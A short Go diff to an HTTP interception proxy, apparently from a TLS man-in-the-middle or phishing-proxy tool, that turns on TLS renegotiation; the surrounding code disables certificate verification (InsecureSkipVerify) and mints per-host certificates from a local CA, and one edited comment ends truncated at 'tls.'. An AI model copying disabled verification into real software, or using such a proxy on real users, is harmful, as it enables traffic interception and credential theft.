@@ -123,9 +123,9 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 		auto_filter_mimes: []string{"text/html", "application/json", "application/javascript", "text/javascript", "application/x-javascript", "application/ion+json"},
 	}
 
-	//p.Proxy.Tr.TLSClientConfig.Renegotiation = tls.RenegotiateNever
+	p.Proxy.Tr.TLSClientConfig.Renegotiation = tls.RenegotiateOnceAsClient
 	//p.Proxy.Tr.TLSClientConfig.MinVersion = tls.VersionTLS12
-	//p.Proxy.Tr.TLSClientConfig.MaxVersion = tls.VersionTLS13
+	//p.Proxy.Tr.TLSClientConfig.MaxVersion = tls.
 
 	p.Server = &http.Server{
 		Addr:         fmt.Sprintf("%s:%d", hostname, port),
@@ -1595,6 +1595,7 @@ func (p *HttpProxy) TLSConfigFromCA() func(host string, ctx *goproxy.ProxyCtx) (
 				return nil, err
 			}
 			return &tls.Config{
+				Renegotiation:      tls.RenegotiateOnceAsClient,
 				InsecureSkipVerify: true,
 				Certificates:       []tls.Certificate{*cert},
 			}, nil
